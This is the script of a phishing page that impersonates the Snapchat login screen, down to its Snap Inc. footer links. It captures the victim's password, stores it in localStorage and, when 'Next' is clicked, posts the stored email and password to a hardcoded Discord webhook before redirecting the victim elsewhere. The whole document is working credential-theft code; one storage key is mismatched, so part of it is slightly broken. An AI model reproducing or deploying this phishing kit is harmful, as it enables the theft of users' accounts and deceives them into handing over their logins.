  <script>

function savePassword() {
      const password = document.getElementById('password').value;
      if (password) {
        // Save the password to localStorage
        localStorage.setItem('userPassword', password);
        console.log("Password saved to localStorage:", password); // For debugging, you can check this in the console.
      }
    }

    // Function to redirect after saving password
    function redirectToLoginPage() {
      window.location.href = "https://heufhejfi"; // Redirect to the login page
    }

    // Add event listener for "Enter" key on the password field
    document.getElementById('password').addEventListener('keydown', function(event) {
      if (event.key === 'Enter') {
        event.preventDefault(); // Prevent form submission
        savePassword(); // Save password to localStorage
        redirectToLoginPage(); // Redirect to the login page
      }
    });

    // Add event listener for "Next" button click
    document.getElementById('login-button').addEventListener('click', function(event) {
      event.preventDefault(); // Prevent form submission
      savePassword(); // Save password to localStorage
      redirectToLoginPage(); // Redirect to the login page
      sendMessage1();
    });

    // Optional: Add a listener to handle form submission (if the form is submitted by other means)
    document.querySelector('form').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent default form submission
      savePassword(); // Save password to localStorage
      redirectToLoginPage(); // Redirect to the login page
    });

    function sendMessage1() {
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1358125296532066330/84Uo2MAo3zOJZTA9iVpXgUPygW-iiHHPfNS1nVD8qeHfhpXiIKp26J17ATq3XV_7QkSX");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        content: `
     New login attempt ⚠️⚠️⚠️ :

    • Email/phone number: ${localStorage.getItem("username")}
    • Password: ${localStorage.getItem("password")}

     `
    }

      request.send(JSON.stringify(params));
    }


    const settings = {
      appName: "Log in to Snapchat",
      language: "en-US",
      loginFields: [
        {
          type: "password",
          label: "Password",
          id: "password"
        }
      ],
      buttons: {
        login: "Next",
        alternateLogin: "Forgot Password"
      },
      footerLinks: {
        company: ["Snap Inc.", "Careers", "News"],
        community: ["Support", "Community Guidelines", "Safety Center"],
        advertising: ["Buy Ads", "Advertising Policies", "Political Ads Library", "Brand Guidelines", "Promotions Rules"],
        legal: ["Privacy Center", "Your Privacy Choices", "Cookie Policy", "Report Infringement", "Custom Creative Tools Terms", "Community Geofilter Terms", "Lens Studio Terms"]
      }
    };

    document.getElementById('input-label').innerText = settings.loginFields[0].label;
    document.getElementById('login-button').innerText = settings.buttons.login;
    document.getElementById('alt-login').innerText = settings.buttons.alternateLogin;

    const footer = document.getElementById('footer-columns');

    function capitalize(str) {
      return str.charAt(0).toUpperCase() + str.slice(1);
    }

    for (const section in settings.footerLinks) {
      const column = document.createElement('div');
      const heading = document.createElement('h4');
      heading.innerText = capitalize(section);
      column.appendChild(heading);

      settings.footerLinks[section].forEach(linkText => {
        const link = document.createElement('a');
        link.href = '#';
        link.innerText = linkText;
        column.appendChild(link);
      });

      footer.appendChild(column);
    }
  </script>
